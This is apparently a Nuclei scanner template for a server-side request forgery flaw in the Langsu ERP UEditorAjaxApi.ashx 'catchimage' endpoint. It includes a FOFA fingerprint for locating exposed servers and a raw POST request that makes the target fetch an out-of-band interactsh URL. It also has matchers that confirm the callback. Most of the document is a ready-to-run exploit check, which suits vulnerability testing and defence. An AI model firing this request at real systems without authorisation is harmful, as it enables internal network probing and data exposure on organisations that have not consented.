id: langsu-erp-ueditorajaxapi-ssrf

info:
  name: "朗速 ERP UEditorAjaxApi.ashx 服务端请求伪造漏洞"
  author: 0dayPoc
  severity: high
  description: |-
    fofa: body="/Resource/Scripts/Yw/Yw_Bootstrap.js"
        朗速ERP UEditorAjaxApi.ashx 接口存在服务端请求伪造漏洞，攻击者可通过构造恶意请求，诱使目标服务器发起未经授权的外部资源请求，导致敏感数据泄露或内部网络探测。
  tags: 朗速ERP

http:
- raw:
  - |
    POST /Api/UEditor/UEditorAjaxApi.ashx?method=catchimage HTTP/1.1
    Host: {{Hostname}}
    Accept: */*
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded; charset=utf-8
    Connection: keep-alive

    source[]=http://{{interactsh-url}}
  matchers-condition: and
  matchers:
  - type: status
    status: [200]
  - type: word
    part: interactsh_protocol
    words:
      - http